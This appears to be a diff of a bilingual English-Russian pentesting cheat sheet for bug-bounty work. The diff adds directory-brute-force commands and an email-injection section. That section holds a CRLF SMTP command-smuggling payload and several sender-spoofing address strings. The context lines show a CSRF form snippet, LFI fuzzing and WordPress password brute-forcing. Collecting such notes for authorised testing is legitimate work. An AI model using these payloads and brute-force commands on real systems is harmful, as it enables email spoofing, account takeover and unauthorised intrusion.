@@ -473,13 +473,6 @@ fragment TypeRef on __Type {
 5. Craft Your Attack: Craft your attack using the identified GraphQL Queries and Mutations (https://www.youtube.com/watch?v=KOCBeJmTs78) with Inql scanner. (https://github.com/doyensec/inql) These methods are often vulnerable to various bug classes, including IDOR, RBAC, Race Condition, SQL, and more (https://habr.com/ru/companies/tomhunter/articles/676478/).
 If you can't find more GraphQL Queries and Mutations, don't worry! Stay tuned for upcoming insights on how to brute force and discover hidden ones.
 Takeaways: Don't hit a dead end with GraphQL apps. Dive deeper, find those concealed GraphQL Queries and Mutations, and unlock unimaginable functionalities that can lead to significant bounties!
-# Crawling parameters with Katana for quick XSS/SQLI
-```sh
-katana -u http://domain.com -silent -d 15 -rl 500 -jc -c 20 -kf all -ct 2m -sf qurl -o urls.txt
-# You can use katana with query url filter (`-f qurl`) to get list of endpoints
-urless -i urls.txt -o output.txt
-nuclei -l output.txt -t /opt/fuzzing-templates/ -silent
-```
 # csrf json
 Во время проекта наткнулся на функциональность изменения профиля. Ну и, понятное дело, не проверить CSRF было бы грехом. Однако, общение с бэкендом происходит через Rest с использованием `Content-type: application/json`. Вместо `application/json` ставим `application/x-www-form-urlencoded`, а тело запроса оставляем прежним :).  
 Сразу хочется отметить, что burp не сгенерирует полезную нагрузку, поэтому вот сниппет, которым можно воспользоваться:
@@ -496,11 +489,22 @@ console.log(params);
 req.send(params);
 </script>
 ```
+# Crawling parameters with Katana for quick XSS/SQLI
+```sh
+katana -u http://domain.com -silent -d 15 -rl 500 -jc -c 20 -kf all -ct 2m -sf qurl -o urls.txt
+# You can use katana with query url filter (`-f qurl`) to get list of endpoints
+urless -i urls.txt -o output.txt
+nuclei -l output.txt -t /opt/fuzzing-templates/ -silent
+```
 # Discover hidden directories:
 ```linux
 ffuf -replay-proxy http://127.0.0.1:8080 #ffuf with proxy
 
 subdinder -d target.com -silent | dnsx -silent | gau
+
+cat web_def_ports | xargs -n 1 /home/toor/.local/bin/feroxbuster -d 1 -w /usr/share/SecLists/Fuzzing/bst.txt -o ferox-finaly --no-state -u
+
+script -q /dev/null -c "cat test | xargs -n 1 /home/toor/.local/bin/feroxbuster -d 1 -w /usr/share/SecLists/Fuzzing/bst.txt -o ferox-finaly --no-state -u" > log.txt
 ```
 ---
 # Discover subdomains:
@@ -520,6 +524,28 @@ wfuzz -c -w /usr/share/dirb/wordlists/LFI-gracefulsecurity-linux.txt -u http://d
 wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
 ```
 ---
+# email injection
+```
+attacker@[testText\r\nRSET\r\nMAIL FROM: <spoofed@example.org>\r\nRCPT TO: <victim@example.org>\r\nDATA\r\nFrom: spoofed@example.org\r\n\r\nText\r\n.\r\nQUIT\r\n]
+```
+
+```
+"Spoofed"
+<attacker@outlook.com>: spoofed@outlook.com
+```
+
+```
+<spoofed@gmail.com> "spoofed" <attacker@gmail.com>
+```
+
+```
+Attacker
+<spoofed@gmail.com>:<attacker@gmail.com>
+```
+
+```
+": <attacker@gmail.com> "<spoofed@gmail.com>"
+```
 # links
 - [steal admin cookie/sqli](./src/marketplace.md) (tryhackme:marketplace)
 - [ohmyweb](./src/omyweb.md)
